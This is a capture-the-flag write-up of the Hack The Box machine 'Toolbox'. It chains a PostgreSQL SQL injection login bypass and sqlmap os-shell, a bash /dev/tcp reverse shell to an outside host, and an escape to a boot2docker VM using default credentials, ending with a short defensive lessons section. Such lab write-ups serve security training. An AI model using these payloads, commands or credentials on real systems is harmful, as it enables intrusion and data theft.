---
title: 'Toolbox'
target: 'Hack The Box — Toolbox'
difficulty: 'easy'
date: 2025-12-20
summary: 'An easy Windows box — exploiting SQL injection in a PHP login backed by PostgreSQL on an admin subdomain revealed via SSL cert, using sqlmap os-shell for a reverse shell inside a Docker container, escaping to the boot2docker VM with default credentials (docker:tcuser), and reading the root flag from the mounted Windows C: drive.'
role: 'pentest'
tags: ['nmap', 'ftp', 'anonymous-ftp', 'smb', 'smbmap', 'sql-injection', 'postgresql', 'burp-suite', 'sqlmap', 'os-shell', 'reverse-shell', 'docker', 'boot2docker', 'container-escape', 'default-credentials', 'ssh', 'privilege-escalation', 'windows']
problem: 'The admin subdomain (leaked via SSL cert) hosts a PHP login backed by PostgreSQL vulnerable to SQL injection. The web app runs inside a Docker container on a boot2docker VM with default SSH credentials (docker:tcuser). The Windows C: drive is mounted into the VM, exposing the Administrator''s files.'
action: 'Nmap found FTP (21) with anonymous login exposing docker-toolbox.exe, HTTPS (443) with an SSL cert leaking admin.megalogistic.com, and standard Windows services. The admin subdomain had a PHP login page. A single quote in the username triggered a pg_query() error exposing the full SQL query. Bypassed auth with admin''-- and confirmed four injection types with sqlmap. Used sqlmap --os-shell for a reverse shell as postgres inside a Docker container (172.17.0.2). SSH-ed to 172.17.0.1 with default boot2docker credentials docker:tcuser, found the Windows C: drive mounted at /c, and retrieved the root flag from /c/Users/Administrator/Desktop.'
outcome: 'Gained Administrator access. PostgreSQL injection provided container-level RCE, default boot2docker credentials escaped to the VM, and the mounted Windows filesystem exposed the root flag without Windows exploitation.'
draft: false
---

## Background

Toolbox is an easy-rated Windows machine that chains SQL injection, Docker container escape, and mounted filesystem access into a clean attack path from web application to Windows Administrator. The interesting part isn't any single vulnerability — it's the layered architecture. A PHP application runs inside a Docker container on a boot2docker VM hosted on a Windows machine, and each layer boundary introduces its own weaknesses. The SQL injection gets you into the container, default credentials get you out of it, and the Windows filesystem mounted into the VM gives you the flag without ever needing to exploit Windows itself.

---

## Enumeration

Running an **nmap** scan with service detection and default scripts against all ports:

```
sudo nmap -sV -sC -p- 10.10.10.236
```

![Terminal showing nmap scan report for 10.10.10.236. Ports open — 21/tcp FTP FileZilla ftpd with anonymous login allowed showing docker-toolbox.exe (242520560 bytes, Feb 18 2020), 22/tcp SSH OpenSSH for_Windows_7.7, 135/tcp MSRPC, 139/tcp NetBIOS, 443/tcp SSL/HTTP Apache 2.4.38 Debian with http-title MegaLogistics and SSL certificate commonName admin.megalogistic.com highlighted in cyan, 445/tcp microsoft-ds, 5985/tcp WinRM HTTPAPI httpd 2.0, 47001/tcp HTTP, and six high-port RPC services 49664-49669. Service Info OS Windows.](/writeups/htb-toolbox/01-nmap-scan.png)

A heavily exposed Windows host with a mix of Windows and Linux services. The key findings from the scan — **anonymous FTP** with a `docker-toolbox.exe` file (confirming Docker infrastructure), **HTTPS on 443** running **Apache 2.4.38 on Debian** (not Windows — meaning a container), and an SSL certificate with `commonName=admin.megalogistic.com` revealing a virtual host. **SSH on 22**, **SMB on 445**, and **WinRM on 5985** round out the Windows services.

The SSL certificate leaking the admin subdomain is the most actionable finding. Adding both `megalogistic.com` and `admin.megalogistic.com` to `/etc/hosts` opens up the web attack surface.

---

## FTP — anonymous access

Verifying the anonymous FTP access to see if there's anything beyond what nmap reported:

```
ftp anonymous@10.10.10.236
```

![Terminal showing FTP connection to 10.10.10.236. FileZilla Server 0.9.60 beta banner. Anonymous login with code 230 Logged on. Remote system type UNIX emulated by FileZilla. Directory listing shows single file — docker-toolbox.exe at 242520560 bytes dated Feb 18 2020.](/writeups/htb-toolbox/02-ftp-anonymous.png)

Only `docker-toolbox.exe` — the Docker Toolbox installer for Windows. No configuration files, no backups, nothing else to extract. But the file's presence confirms the target is using **Docker Toolbox** rather than Docker Desktop, which means the Docker host is a **boot2docker** VM running inside VirtualBox. This distinction matters later.

---

## SMB — no anonymous access

Testing SMB with both null and bogus credentials:

```
smbmap -u bogus -H 10.10.10.236
smbmap -H 10.10.10.236
```

![Terminal showing two smbmap commands. First with -u bogus -H 10.10.10.236 returning authentication error. Second with just -H 10.10.10.236 also returning authentication error on 10.10.10.236.](/writeups/htb-toolbox/03-smbmap-fail.png)

Both attempts return **authentication errors** — no anonymous or guest SMB access on this box. SMB is a dead end without credentials.

---

## Web application — SQL injection

The main domain `megalogistic.com` serves a standard corporate landing page with no interesting functionality. The admin subdomain `admin.megalogistic.com` presents a PHP login form. Testing the login with default credentials fails, so the next step is probing the input handling with Burp Suite.

Sending a login request with a single quote appended to the username (`admin'`) produces a revealing error in the response:

![Burp Suite showing a POST request to admin.megalogistic.com with username=admin' and password=pass. The response panel shows a pg_query() Warning with the error message — syntax error at or near "pass", revealing the full SQL query: SELECT * FROM users WHERE username = 'admin'' AND password = md5('pass'), with the file path /var/www/admin/index.php highlighted.](/writeups/htb-toolbox/04-burp-sqli.png)

The error message exposes everything needed to exploit this — the **pg_query()** function identifies **PostgreSQL** as the database backend, and the full SQL query is visible: `SELECT * FROM users WHERE username = 'admin'' AND password = md5('pass')`. The query concatenates user input directly into the SQL string with no parameterization, and the error even leaks the server-side file path `/var/www/admin/index.php`.

With the full query structure known, bypassing authentication is straightforward. Using `admin'--` as the username comments out the password check entirely, turning the query into:

```sql
SELECT * FROM users WHERE username = 'admin'-- AND password = md5('pass');
```

This logs in as admin. The dashboard behind the login shows server status, a to-do list, and an order list — but no file upload, no command execution, nothing that provides a direct path forward. The value here is confirming the injection works, which opens the door for automated exploitation with sqlmap.

---

## Exploiting SQL injection with sqlmap

Running **sqlmap** against the login form to enumerate all injection types and extract data:

```
sqlmap -u https://admin.megalogistic.com --batch --force-ssl --dbms=PostgreSQL -X POST --data "username=tony&password=pass"
```

![Terminal showing sqlmap output. POST parameter 'username' is vulnerable. Four injection types identified — boolean-based blind (OR boolean-based WHERE or HAVING clause with payload username=-4406' OR 2304=2304--), error-based (PostgreSQL AND error-based using CAST and CHR functions), stacked queries (PostgreSQL > 8.1 with SELECT PG_SLEEP(5)), and time-based blind (PostgreSQL > 8.1 AND time-based with PG_SLEEP). Total 159 HTTP requests.](/writeups/htb-toolbox/05-sqlmap-injection.png)

Four injection types confirmed on the username parameter — **boolean-based blind**, **error-based**, **stacked queries**, and **time-based blind**. The stacked queries capability is significant because PostgreSQL's stacked query support is what enables `--os-shell` through sqlmap later.

Dumping the database contents:

```
sqlmap -u https://admin.megalogistic.com --batch --force-ssl --dbms=PostgreSQL -X POST --data "username=tony&password=pass" --dump
```

![Terminal showing sqlmap database dump. Database public, table users, 1 entry. The table shows password 4a100a85cb5ca3616dcf137918550815 and username admin. Dictionary-based cracking with md5_generic_passwd started with 4 processes but found no clear password.](/writeups/htb-toolbox/06-sqlmap-dump.png)

One entry in the **users** table — `admin` with an MD5 hash of `4a100a85cb5ca3616dcf137918550815`. The hash didn't crack with sqlmap's default dictionary, but it doesn't matter — the SQL injection already bypasses authentication, and stacked queries give a path to command execution.

---

## Shell as postgres — inside the container

Using sqlmap's `--os-shell` to leverage PostgreSQL's `COPY TO/FROM PROGRAM` functionality for command execution, then upgrading to a proper reverse shell:

```
sqlmap -u https://admin.megalogistic.com --batch --force-ssl --dbms=PostgreSQL -X POST --data "username=tony&password=pass" --os-shell
```

From the os-shell, launching a bash reverse shell:

```
bash -c 'sh -i >& /dev/tcp/10.10.14.15/8999 0>&1'
```

![Terminal showing sqlmap os-shell executing a bash reverse shell via /dev/tcp. Connection times out on sqlmap's end. Below, a netcat listener on port 8999 receives the connection from 10.10.10.236. Shell upgraded with python3 -c 'import pty;pty.spawn("bash")' followed by Ctrl+Z, stty raw echo, and fg to fully stabilize. Final prompt shows postgres@bc56e3cc55e9 in /var/lib/postgresql/11/main.](/writeups/htb-toolbox/07-reverse-shell.png)

The reverse shell connects back as **postgres@bc56e3cc55e9** — the hostname is a Docker container ID, confirming the web application runs inside a container. The shell is stabilized with the standard Python PTY spawn and stty technique. The user flag was retrieved from the postgres user's home directory.

---

## Docker escape — boot2docker default credentials

Running `ifconfig` inside the container reveals the network layout:

![Terminal showing ifconfig output inside the Docker container. Interface eth0 with flags UP, BROADCAST, RUNNING, MULTICAST, MTU 1500. IPv4 address 172.17.0.2, netmask 255.255.0.0, broadcast 172.17.255.255. MAC address 02:42:ac:11:00:02.](/writeups/htb-toolbox/08-docker-ifconfig.png)

The container sits on the standard Docker bridge network at **172.17.0.2** — which means the Docker host is at **172.17.0.1**. The `docker-toolbox.exe` on FTP already confirmed this is a **Docker Toolbox** installation, which uses **boot2docker** — a lightweight Tiny Core Linux distribution designed to run Docker containers entirely from RAM. Boot2docker is deprecated, but more importantly, it ships with well-known default SSH credentials: **docker:tcuser**.

SSHing from the container to the Docker host:

```
ssh docker@172.17.0.1
```

The default credentials work — escaping the container into the boot2docker VM. From here, the Windows host's C: drive is mounted at `/c`, making the entire Windows filesystem accessible from the Linux layer.

---

## Root flag — mounted Windows filesystem

Navigating the mounted Windows drive to the Administrator's desktop:

![Terminal showing docker@box prompt. Commands cd /c, ls showing Users directory, attempted cd Users/Administrators/Desktop fails with No such file, corrected to cd /c/Users/Administrator/Desktop. Directory listing shows desktop.ini and root.txt. cat root.txt displays the flag cc9a0b76ac17f8f475250738b96261b3.](/writeups/htb-toolbox/09-root-flag.png)

The root flag was retrieved from `C:\Users\Administrator\Desktop\root.txt` — accessed through the Linux mount at `/c/Users/Administrator/Desktop`. No Windows exploitation required — the Docker Toolbox architecture mounts the host filesystem into the VM by design, and default credentials on the VM expose everything.

---

## What I took from this

Toolbox is a lesson in how layered architectures create unexpected attack surfaces. The web application itself has a textbook SQL injection — unsanitized input concatenated into a query string, with the full query leaked in error messages. But the interesting part isn't the injection; it's what happens after. The application runs inside a Docker container, so gaining code execution through `--os-shell` only gets you into an isolated environment with no direct path to the Windows host. The escape comes from an entirely different vulnerability class — default credentials on the Docker host VM.

The boot2docker default credentials (`docker:tcuser`) are a real-world risk that Docker Toolbox installations carry. Docker Toolbox was the standard way to run Docker on Windows before Docker Desktop existed, and many legacy installations still use it. The default credentials are documented publicly and rarely changed because administrators often don't realize the VM is accessible from within containers on the bridge network. The fix is straightforward — change the password or disable SSH on the VM — but it requires knowing the VM exists as an attackable surface in the first place.

The filesystem mount is the final piece that makes the chain complete. Docker Toolbox shares the host's drives with the boot2docker VM through VirtualBox shared folders, which means anyone with access to the VM can read and write the Windows filesystem. This is by design — it's how Docker volumes work in the Toolbox architecture — but it means that compromising the VM is functionally equivalent to compromising the Windows host. The entire privilege boundary between the Linux VM and Windows disappears once you have shell access to the VM. In a real environment, this architecture means that a containerized web application vulnerability can cascade all the way to full Windows domain compromise without ever exploiting a Windows service.
